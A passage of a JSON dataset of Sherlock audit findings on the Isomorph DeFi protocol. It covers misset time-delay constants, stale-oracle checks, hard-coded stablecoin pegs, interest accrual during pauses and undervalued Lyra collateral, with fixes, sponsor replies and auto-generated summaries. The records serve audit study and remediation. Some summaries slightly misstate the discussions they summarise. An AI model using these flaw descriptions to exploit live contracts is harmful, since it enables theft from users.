change `_calculateProposedReturnedCapital` to be similar to `totalCollateralValue`, summing all pooled tokens before pricing. This has been confirmed and fixed by Sponsor kree-dotcom.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/174",
      "tags": [
        "Truncation",
        "Array"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "5700",
      "title": "M-8: Wrong `CHANGE_COLLATERAL_DELAY` in CollateralBook",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/191 \n\n## Found by \nGimelSec, CodingNameKiki, ctf\\_sec, Jeiwan, yixxas, 0xjayne, rvierdiiev\n\n## Summary\n\nAdmins can bypass time delay due to the wrong value of `CHANGE_COLLATERAL_DELAY`.\n\n## Vulnerability Detail\n\nThe comment shows that the `CHANGE_COLLATERAL_DELAY` should be 2 days, but it's only 200 which means 3 minutes and 20 seconds.\n\n## Impact\n\nAdmin can bypass the 2 days time delay and only need to wait less than 5 minutes to call `changeCollateralType`.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/CollateralBook.sol#L23\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/CollateralBook.sol#L130\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```solidity\nuint256 public constant CHANGE_COLLATERAL_DELAY = 2 days; //2 days\n```\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. Duplicate of issue #231",
      "summary": "\nA bug has been found in the CollateralBook code where the `CHANGE_COLLATERAL_DELAY` value is set to 200, which is only 3 minutes and 20 seconds. This allows admins to bypass the intended 2 day time delay when calling `changeCollateralType`, which could have significant implications. The code snippet for this bug can be found at https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/CollateralBook.sol#L23 and https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/CollateralBook.sol#L130. The bug was discovered by GimelSec, CodingNameKiki, ctf\\_sec, Jeiwan, yixxas, 0xjayne, and rvierdiiev. The recommendation to fix the bug is to set the `CHANGE_COLLATERAL_DELAY` value to 2 days. The sponsor has confirmed that the bug will be fixed, and this is a duplicate of issue #231.",
      "quality_score": 1,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/191",
      "tags": [
        "Typo / CopyPaste"
      ],
      "finders": [
        "0xjayne",
        "yixxas",
        "Jeiwan",
        "CodingNameKiki",
        "rvierdiiev",
        "GimelSec",
        "ctf\\_sec"
      ]
    },
    {
      "id": "5699",
      "title": "M-7: `latestRoundData()` has no check for round completeness",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/200 \n\n## Found by \n\\_\\_141345\\_\\_, 8olidity, yixxas, caventa, HonorLt\n\n## Summary\n\nNo check for round completeness could lead to stale prices and wrong price return value, or outdated price. The functions rely on accurate price feed might not work as expected, sometimes can lead to fund loss. \n\n\n## Vulnerability Detail\n\nThe oracle wrapper `getOraclePrice()` call out to an oracle with `latestRoundData()` to get the price of some token. Although the returned timestamp is checked, there is no check for round completeness.\n\nAccording to Chainlink's documentation, this function does not error if no answer has been reached but returns 0 or outdated round data. The external Chainlink oracle, which provides index price information to the system, introduces risk inherent to any dependency on third-party data sources. For example, the oracle could fall behind or otherwise fail to be maintained, resulting in outdated data being fed to the index price calculations. Oracle reliance has historically resulted in crippled on-chain systems, and complications that lead to these outcomes can arise from things as simple as network congestion.\n\n## Reference\nChainlink documentation:\nhttps://docs.chain.link/docs/historical-price-data/#historical-rounds\n\n## Impact\n\nIf there is a problem with chainlink starting a new round and finding consensus on the new value for the oracle (e.g. chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the chainlink system) consumers of this contract may continue using outdated stale data (if oracles are unable to submit no new round is started).\n\nThis could lead to stale prices and wrong price return value, or outdated price.\n\nAs a result, the functions rely on accurate price feed might not work as expected, sometimes can lead to fund loss. The impacts vary and depends on the specific situation like the following:\n- incorrect liquidation\n    - some users could be liquidated when they should not\n    - no liquidation is performed when there should be\n- wrong price feed \n    - causing inappropriate loan being taken, beyond the current collateral factor\n    - too low price feed affect normal bor\n\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_Base.sol#L164-L181\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nValidate data feed for round completeness:\n```solidity\n    function getOraclePrice(IAggregatorV3 _priceFeed, int192 _maxPrice, int192 _minPrice) public view returns (uint256 ) {\n        (\n            uint80 roundID,\n            int signedPrice,\n            /*uint startedAt*/,\n            uint timeStamp,\n            uint80 answeredInRound\n        ) = _priceFeed.latestRoundData();\n        //check for Chainlink oracle deviancies, force a revert if any are present. Helps prevent a LUNA like issue\n        require(signedPrice > 0, \"Negative Oracle Price\");\n        require(timeStamp >= block.timestamp - HEARTBEAT_TIME , \"Stale pricefeed\");\n        require(signedPrice < _maxPrice, \"Upper price bound breached\");\n        require(signedPrice > _minPrice, \"Lower price bound breached\");\n        require(answeredInRound >= roundID, \"round not complete\");\n\n        uint256 price = uint256(signedPrice);\n        return price;\n    }\n```\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. \n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/5c656e791e70ecdfe26f9807438498384d7f6108",
      "summary": "\nThis bug report is about an issue found in the oracle wrapper `getOraclePrice()` of the Velo-Deposit-Tokens contract. This function calls out to an oracle with `latestRoundData()` to get the price of some token, however, there is no check for round completeness. As a result, the returned data might be outdated, leading to stale prices and wrong price return value. This could cause the functions relying on accurate price feed to not work as expected, and sometimes can lead to fund loss.\n\nThe impact of this issue varies depending on the situation, such as incorrect liquidation, wrong price feed, and inappropriate loan being taken. A code snippet and a reference to Chainlink's documentation are provided for further understanding.\n\nThe issue was found by \\_\\_141345\\_\\_, 8olidity, yixxas, caventa, HonorLt, and was fixed by kree-dotcom. The recommendation is to validate data feed for round completeness by adding a check for `answeredInRound >= roundID`.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/200",
      "tags": [
        "Stale Price",
        "Oracle"
      ],
      "finders": [
        "8olidity",
        "yixxas",
        "\\_\\_141345\\_\\_",
        "caventa",
        "HonorLt"
      ]
    },
    {
      "id": "5698",
      "title": "M-6: Dangerous assumption on the peg of USDC can lead to manipulations",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/224 \n\n## Found by \nDeivitto, yixxas, Jeiwan\n\n## Summary\nDangerous assumption on the peg of USDC can lead to manipulations\n## Vulnerability Detail\nWhen pricing liquidity of a Velodrome USDC pool, it's assumed that hte price of USDC is exactly $1 ([DepositReceipt_USDC.sol#L100](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L100), [DepositReceipt_USDC.sol#L123](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L123)). However, in reality, there's no hard peg, the price can go both above or below $1 (https://coinmarketcap.com/currencies/usd-coin/).\n\nThe volatility of USDC will also affect the price of the other token in the pool since it's priced in USDC ([DepositReceipt_USDC.sol#L87](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L87), [DepositReceipt_USDC.sol#L110](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L110)) and then compared to its USD price from a Chainlink oracle ([DepositReceipt_USDC.sol#L90-L98](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L90-L98)).\n\nThis issue is also applicable to the hard coded peg of sUSD when evaluating the USD price of a Synthetix collateral ([Vault_Synths.sol#L76](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Synths.sol#L76)):\n```solidity\n/// @return returns the value of the given synth in sUSD which is assumed to be pegged at $1.\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n    //As it is a synth use synthetix for pricing\n    return (synthetixExchangeRates.effectiveValue(_currencyKey, _amount, SUSD_CODE));      \n}\n```\nAnd sUSD is even less stable than USDC (https://coinmarketcap.com/currencies/susd/).\n\nTogether with isoUSD not having a stability mechanism, these assumptions can lead to different manipulations with the price of isoUSD and the arbitraging opportunities created by the hard peg assumptions (sUSD and USDC will be priced differently on exchanges and on Isomorph).\n\n## Impact\nIf the price of USDC falls below $1, collateral will be priced higher than expected. This will keep borrowers from being liquidated. And it will probably affect the price of isoUSD since there will be an arbitrage opportunity: the cheaper USDC will be priced higher as collateral on Isomorph.\nIf hte price of USDC raises above $1, borrowers' collateral will be undervalued and some liquidations will be possible that wouldn't have be allowed if the actual price of USDC was used.\n\n## Code Snippet\nThe value of USDC equals its amount ([DepositReceipt_USDC.sol#L100](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L100), [DepositReceipt_USDC.sol#L123](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L123)):\n```solidity\nvalue0 = token0Amount * SCALE_SHIFT;\n```\n\nThe other token in a pool is priced in USDC ([DepositReceipt_USDC.sol#L87](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L87), [DepositReceipt_USDC.sol#L110](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_USDC.sol#L110)):\n```solidity\n(amountOut, stablePool) = router.getAmountOut(HUNDRED_TOKENS, token1, USDC);\n```\n## Tool used\nManual Review\n\n## Recommendation\nConsider using the Chainlink USDC/USD feed to get the price of USDC and price liquidity using the actual price of USDC. Also, consider converting sUSD prices of Synthetix collaterals to USD to mitigate the discrepancy in prices between external exchanges and Isomorph.\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed however this is part of the protocol design. That said now that we have the duel oracle system for DepositReceipt_ETH it should not be too difficult to replicate this with minor changes so that the USDC value in DepositReceipt_USDC uses a chainlink oracle also.\n\nAs for sUSD, we will explore how changes might impact the system. The system is already designed to absorb small fluctuations in the value of sUSD by having a gap between the opening margin and the liquidation margin. However we can see that it can be unfair to a user if they get liquidated because they fairly price their Synth collateral using sUSD = $1.01 rather than the hardcoded exchange rate.",
      "summary": "\nThis bug report is about a dangerous assumption on the peg of USDC that can lead to manipulations. It was found by Deivitto, yixxas, and Jeiwan and was manually reviewed. The issue is that when pricing liquidity of a Velodrome USDC pool, it is assumed that the price of USDC is exactly $1, however in reality this is not the case. The volatility of USDC will also affect the price of the other token in the pool since it is priced in USDC. This issue is also applicable to the hard coded peg of sUSD when evaluating the USD price of a Synthetix collateral.\n\nThe impact of this bug is that if the price of USDC falls below $1, collateral will be priced higher than expected and this will keep borrowers from being liquidated. If the price of USDC raises above $1, borrowers' collateral will be undervalued and some liquidations will be possible that wouldn't have be allowed if the actual price of USDC was used.\n\nThe recommendation to mitigate this issue is to consider using the Chainlink USDC/USD feed to get the price of USDC and price liquidity using the actual price of USDC. Additionally, consider converting sUSD prices of Synthetix collaterals to USD to mitigate the discrepancy in prices between external exchanges and Isomorph. \n\nKree-dotcom mentioned that this is part of the protocol design, however they will explore how changes might impact the system. They also mentioned that the system is already designed to absorb small fluctuations in the value of sUSD by having a gap between the opening margin and the liquidation margin, however it can be unfair to a user if they get liquidated because they fairly price their Synth collateral using sUSD = $1.01 rather than the hardcoded exchange rate.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/224",
      "tags": [
        "Pegged"
      ],
      "finders": [
        "Jeiwan",
        "Deivitto",
        "yixxas"
      ]
    },
    {
      "id": "5697",
      "title": "M-5: increaseCollateralAmount : User is not allowed to increase collateral freely.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/229 \n\n## Found by \nak1, bin2chen, rvierdiiev\n\n## Summary\n\nFor all the tree type of vault, a user is allowed to increase collateral only if the overall collateral value is higher than the margin value.\n\nimo, this restriction may not be needed. anyway user is adding the collateral that could eventually save from liquidation.\n\nProtocol will loose advantage due to this restriction.\n\n## Vulnerability Detail\n\nCodes from lyra vault implementation :\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Lyra.sol#L155-L192\n\nLine 184 \n\n        require(colInUSD >= borrowMargin, \"Liquidation margin not met!\");\n\n\nFor synth - Refer [here](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Synths.sol#L147)\n\nFor velo - Refer [here](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Velo.sol#L459)\n\n## Impact\n\nUser may not have the collateral all at once, but they can add like an EMI. \n\nProtocol will loose the repayment anyway.\n\nWhat is no one comes for liquidation - again this could lose.\n\n## Code Snippet\n\nRefer vulnerability section\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow user add collateral freely.\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. Issue #41 is a duplicate of this\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/isomorph/commit/6b403bad09388fca0153b843a2e552b5e3d235cd",
      "summary": "\nThis bug report is related to the vault implementation of Isomorph, a decentralized finance protocol. It was found by ak1, bin2chen, and rvierdiiev and focuses on a restriction put in place that does not allow users to freely increase their collateral. The restriction requires that the overall collateral value must be higher than the margin value before a user is allowed to increase their collateral. This restriction was found in the Lyra vault implementation code, as well as the Synths and Velo vault implementations. \n\nThe impact of this restriction is that users may not have all the collateral they need at once, but instead have to add it like an EMI, which can lead to losses for the protocol if no one comes for liquidation. The tool used to find this bug was manual review. The recommendation is to allow users to increase their collateral freely. \n\nThe bug was fixed by kree-dotcom in the commit 6b403bad09388fca0153b843a2e552b5e3d235cd. Issue #41 was a duplicate of this bug.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/229",
      "tags": [
        "Liquidation",
        "Business Logic"
      ],
      "finders": [
        "rvierdiiev",
        "bin2chen",
        "ak1"
      ]
    },
    {
      "id": "5696",
      "title": "M-4: Wrong constants for time delay",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/231 \n\n## Found by \nGimelSec, neumo, 0x4non, hansfriese, rvierdiiev, wagmi, jonatascm\n\n\n\n## Summary\nThis protocol uses several constants for time dealy and some of them are incorrect.\n\n## Vulnerability Detail\nIn `isoUSDToken.sol`, `ISOUSD_TIME_DELAY` should be `3 days` instead of 3 seconds.\n\n```solidity\n    uint256 constant ISOUSD_TIME_DELAY = 3; // days;\n```\n\nIn `CollateralBook.sol`, `CHANGE_COLLATERAL_DELAY` should be `2 days` instead of 200 seconds.\n\n```solidity\n    uint256 public constant CHANGE_COLLATERAL_DELAY = 200; //2 days\n```\n\n## Impact\nAdmin settings would be updated within a short period of delay so that users wouldn't react properly.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/isoUSDToken.sol#L10\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/CollateralBook.sol#L23\n\n## Tool used\nManual Review\n\n## Recommendation\n2 constants should be modified as mentioned above.\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix.\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/isomorph/commit/4fc80e6178204691a365f656908c278d5faf4f88 , woops then forgot a semicolon, this was added here https://github.com/kree-dotcom/isomorph/commit/9bad2748dd3f3e7905dc8013383aef0cf98b1bea\n\nisoToken was not altered in this commit but is correct. I made a copying error when setting up the Audit repo originally.\n\nhttps://github.com/kree-dotcom/isomorph/blob/4fc80e6178204691a365f656908c278d5faf4f88/contracts/isoUSDToken.sol#L10",
      "summary": "\nThis bug report is about two constants that are incorrectly set in the protocol `isoUSDToken.sol` and `CollateralBook.sol`. The `ISOUSD_TIME_DELAY` constant should be set to `3 days` instead of `3 seconds` and the `CHANGE_COLLATERAL_DELAY` constant should be set to `2 days` instead of `200 seconds`. If these constants are not updated, admin settings would be updated too quickly and users may not be able to react properly. The bug was found by GimelSec, neumo, 0x4non, hansfriese, rvierdiiev, wagmi, jonatascm and the tool used was manual review. The recommendation is to modify the two constants as mentioned above. The sponsor has confirmed the issue and fixed it, as well as adding a semicolon that was forgotten. The `isoToken` was not altered in the commit but it is correct.",
      "quality_score": 1,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/231",
      "tags": [
        "Typo / CopyPaste"
      ],
      "finders": [
        "neumo",
        "hansfriese",
        "wagmi",
        "rvierdiiev",
        "GimelSec",
        "jonatascm",
        "0x4non"
      ]
    },
    {
      "id": "5695",
      "title": "M-3: The protocol shouldn't charge interests when paused",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/234 \n\n## Found by \nhansfriese, rvierdiiev\n\n\n\n## Summary\nThe protocol charges interest from users using `virtualPrice` and it increases when the protocol is paused.\n\nAs a result, users would be forced to pay more interests and experience an unexpected liquidation.\n\n## Vulnerability Detail\nThe protocol has 3 kinds of the vault and each one has `pause/unpause` option by `pausers`.\n\nAlso, each collateral would be paused using `CollateralBook.pauseCollateralType()`.\n\nBut it updates the `virtualPrice` during the paused period and the below scenarios would be possible.\n\n#### Scenario 1\n1. A user `Alice` opened a loan using some collaterals.\n2. The vault was paused for a while for some unexpected reason.\n3. Meanwhile, her loan was changed to a `liquidatable` one but she can't add collaterals(or close the loan) in the paused state.\n4. After the protocol is unpaused, she's trying to protect her loan by adding collaterals but `Bob` can liquidate her loan with front running.\n5. Even if her loan isn't liquidated, she should pay interests during the paused period and it's not fair for her.\n\n#### Scenario 2\n1. A user `Alice` opened a loan with `minOpeningMargin = 101%`.\n2. After the protocol was paused for some reason, the admin decided to change `minOpeningMargin = 105%`.\n3. `Alice` wants to close her loan before it's applied because it's too high for her but she can't because it's paused.\n4. After the new `minOpeningMargin` is applied, `Alice` will be forced to pay interests of the higher `minOpeningMargin` for the paused period.\n\nWhen I check other protocols to charge interests, it's normal to enable some ways to protect their loans during the paused period for users.\n\nCurrently, all functions don't work in the paused mode and it shouldn't charge interests in this case.\n\n## Impact\nUsers might be forced to pay more interests or their loans might be liquidated unexpectedly.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/CollateralBook.sol#L127\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Base_ERC20.sol#L85\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Velo.sol#L141\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Base_ERC20.sol#L203-L221\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Velo.sol#L248-L265\n\n## Tool used\nManual Review\n\n## Recommendation\nWe shouldn't increase the `virtualPrice` during the paused period.\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. Partial duplicate of issues #42 and issue #38. This was a design decision but we have decided to change it so that users can closeLoans, addCollateral or be liquidated when a collateral/vault is Paused.\n\n**kree-dotcom**\n\nAllow users to call `increaseCollateralAmount()`, `closeLoan()` and `callLiquidation()` of each Vault while the vault is paused. \nhttps://github.com/kree-dotcom/isomorph/commit/627212dcdcc3c22553de5587a90c9fae211a4888\n\n**kree-dotcom**\n\nFreeze collateral interest when collateral is paused. https://github.com/kree-dotcom/isomorph/commit/8ed4909462315bda79a08b773c530dfadfc1c4a3\n\nThis is achieved by ensuring the virtualPrice is up-to-date when pausing and then altering the lastUpdateTime when unpausing so that the system thinks the virtualPrice has been updated for the paused time period. \n\nIf a collateral is paused and unpaused often then interest owed can be lost because of rounding here as we can lose <180s of interest due per pausing. However as only admins can pause collaterals this is deemed an insignificant risk to the system as it would just slightly reduce fees owed on one collateral.",
      "summary": "\nThis bug report is about an issue found in the protocol which charges interests from users using `virtualPrice` and it increases when the protocol is paused. This can cause users to pay more interests and experience an unexpected liquidation. There are two scenarios that can occur, the first being that a user won't be able to add collaterals or close the loan during the paused period, and the second being that a user won't be able to close the loan before a new `minOpeningMargin` is applied. The impact of this issue is that users can be forced to pay more interests or their loans can be liquidated unexpectedly. The code snippet can be found in the link provided. \n\nThe recommendation given was to not increase the `virtualPrice` during the paused period. The discussion that followed was that the sponsor confirmed the issue and would fix it, and that the system would allow users to call `increaseCollateralAmount()`, `closeLoan()` and `callLiquidation()` of each Vault while the vault is paused. The system would also freeze collateral interest when the collateral is paused. However, if the collateral is paused and unpaused often then interest owed can be lost due to rounding.",
      "quality_score": 4.5,
      "rarity_score": 3.5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/234",
      "tags": [
        "Pause"
      ],
      "finders": [
        "rvierdiiev",
        "hansfriese"
      ]
    },
    {
      "id": "5694",
      "title": "M-2: Lyra vault underestimates the collateral value",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/242 \n\n## Found by \nhansfriese\n\n## Summary\n\nLyra vault subtracts the withdrawal fee while calculating the collateral value in USD, and it does not match the actual Lyra Pool implementation.\n\n## Vulnerability Detail\n\nThe user's collateral value is estimated using the function `priceCollateralToUSD()` at `Vault_Lyra.sol#L77` as follows.\n\n```solidity\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n        //The LiquidityPool associated with the LP Token is used for pricing\n    ILiquidityPoolAvalon LiquidityPool = ILiquidityPoolAvalon(collateralBook.liquidityPoolOf(_currencyKey));\n    //we have already checked for stale greeks so here we call the basic price function.\n    uint256 tokenPrice = LiquidityPool.getTokenPrice();\n    uint256 withdrawalFee = _getWithdrawalFee(LiquidityPool);\n    uint256 USDValue  = (_amount * tokenPrice) / LOAN_SCALE;\n    //we remove the Liquidity Pool withdrawalFee\n    //as there's no way to remove the LP position without paying this.\n    uint256 USDValueAfterFee = USDValue * (LOAN_SCALE- withdrawalFee)/LOAN_SCALE;\n    return(USDValueAfterFee);\n}\n```\n\nSo it is understood that the withdrawal fee is removed to get the reasonable value of the collateral.\nBut according to the [Lyra Pool implementation](https://github.com/lyra-finance/lyra-protocol/blob/master/contracts/LiquidityPool.sol#L341), the token price used for withdrawal is calculated using the function `_getTotalBurnableTokens`.\nAnd the function `_getTotalBurnableTokens` is as belows.\n\n```solidity\nfunction _getTotalBurnableTokens()\n    internal\n    returns (\n      uint tokensBurnable,\n      uint tokenPriceWithFee,\n      bool stale\n    )\n  {\n    uint burnableLiquidity;\n    uint tokenPrice;\n    (tokenPrice, stale, burnableLiquidity) = _getTokenPriceAndStale();\n\n    if (optionMarket.getNumLiveBoards() != 0) {\n      tokenPriceWithFee = tokenPrice.multiplyDecimal(DecimalMath.UNIT - lpParams.withdrawalFee);\n    } else {\n      tokenPriceWithFee = tokenPrice;//@audit withdrawalFee is not applied if there are no live borads\n    }\n\n    return (burnableLiquidity.divideDecimal(tokenPriceWithFee), tokenPriceWithFee, stale);\n  }\n```\n\nFrom the code, it is clear that the withdrawal fee is subtracted only when the related option market has live boards.\nBecause `Vault_Lyra.sol` applies a withdrawal fee all the time to price the collateral, it means the user's collateral is under-valued.\n\n## Impact\n\nUser's collaterals are under-valued than reasonable and might get to a liquidatable status sooner than expected. A liquidator can abuse this to get an unfair profit by liquidating the user's collateral with the under-estimated value and withdrawing it from the Lyra pool without paying a withdrawal fee.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Lyra.sol#L77\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nMake sure to apply withdrawal fee consistent to how Lyra pool does.\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix\n\n**kree-dotcom**\n\nCurrently this fix looks like it will be quite a lot of alterations. If there is time and it doesn't introduce too many changes for Sherlock to check we will try to fix it. \n\nThe reason is the call added must be made to the optionMarket contract of each collateral, this address is stored as an internal address in liquidityPool and other contracts, therefore to access it we must add another field to Lyra collateral in the collateral book, this would involve altering all collateralBook functions to expect another field as well as other vaults and systems to adhere to this larger model. \n\nAlternatively we can add another mapping to the Vault_Lyra to store the OptionsMarkets and an admin only function to add new ones but this feels like poor design.\n\nLeaving this issue unfixed is unlikely to cause large problems. LiquidityTokens should only have zero live boards if an optionMarket is closed (usually to be depreciated) with zero live boards the collateral should be earning no interest for the owner and therefore they would likely desire to close their loan and redeem their collateral and so not be in a situation to be liquidated.",
      "summary": "\nIn this bug report, the issue M-2 is related to the Lyra vault underestimating the collateral value. This was found by hansfriese. The function `priceCollateralToUSD()` at `Vault_Lyra.sol#L77` is used to calculate the user's collateral value, and it subtracts the withdrawal fee while calculating the collateral value in USD. This does not match with the actual Lyra Pool implementation, which calculates the token price used for withdrawal with the function `_getTotalBurnableTokens`. This means that the user's collateral is under-valued and they might get to a liquidatable status sooner than expected. A liquidator can abuse this to get an unfair profit by liquidating the user's collateral with the under-estimated value and withdrawing it from the Lyra pool without paying a withdrawal fee. It is recommended to make sure to apply withdrawal fee consistent to how Lyra pool does. The sponsor confirmed to fix this issue, though it might require a lot of alterations. Alternatively, an admin only function can be added to store the OptionsMarkets in the Vault_Lyra, but this is not recommended. Leaving this issue unfixed is unlikely to cause large problems as liquidityTokens should only have zero live boards if an optionMarket is closed.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/242",
      "tags": [
        "External Contract"
      ],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "5693",
      "title": "M-1: DepositReceipt_Base.sol#L21 : HEARTBEAT_TIME gap is too huge",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/256 \n\n## Found by \nak1\n\n## Summary\n\nHEARTBEAT_TIME = 24 hours could not be safe. The oracle data still be stale one.\n\n## Vulnerability Detail\n\noracle is using the HEARTBEAT_TIME  as 24 hours. Since the price of oracle could vary in the time gap of 3 hours, using 24 hours could be still dangerous.\n\n## Impact\nStale data used. Front runnable issue.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/DepositReceipt_Base.sol#L21\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse 3 hours as hearbeat.\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor Confirmed. 24Hrs was originally for the sUSD chainlink feed, as seen here it can and should be much lower for other price feeds https://data.chain.link/optimism/mainnet/crypto-usd/eth-usd (mouse over trigger parameters)\n\n**kree-dotcom**\n\nclicked wrong button\n\n**kree-dotcom**\n\n3 hours as recommended by the auditor does not seem sufficient. Some Optimism price feeds such as ETH/USD and OP/USD have Heartbeats of 1200s or 20min. Currently we cannot find a method to fetch this via the oracle address and it looks like the Heartbeat sensitivity would have to be set per deployment of the depositReceipt.\n\n**kree-dotcom**\n\nFixed, https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/398f40cce538461396966ac22273f846d56f6f27\n\n`HEARTBEAT_TIME` is now an immutable var that is set by the deployer for each instance of a depositReceipt.",
      "summary": "\nThis bug report is about the `HEARTBEAT_TIME` variable in the `DepositReceipt_Base.sol` file located at line 21. It was found by ak1 and the vulnerability is that the `HEARTBEAT_TIME` is set to 24 hours, which could lead to stale data being used. This could potentially create a front runnable issue. The recommended solution is to use 3 hours as the `HEARTBEAT_TIME`. \n\nThe discussion then followed, with kree-dotcom noting that 3 hours may not be sufficient and that the `HEARTBEAT_TIME` should be set per deployment of the depositReceipt. It was then fixed, with `HEARTBEAT_TIME` now an immutable var that is set by the deployer for each instance of a depositReceipt.",
      "quality_score": 2,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/256",
      "tags": [
        "Oracle"
      ],
      "finders": [
        "ak1"
      ]
    },
    {
      "id": "5692",
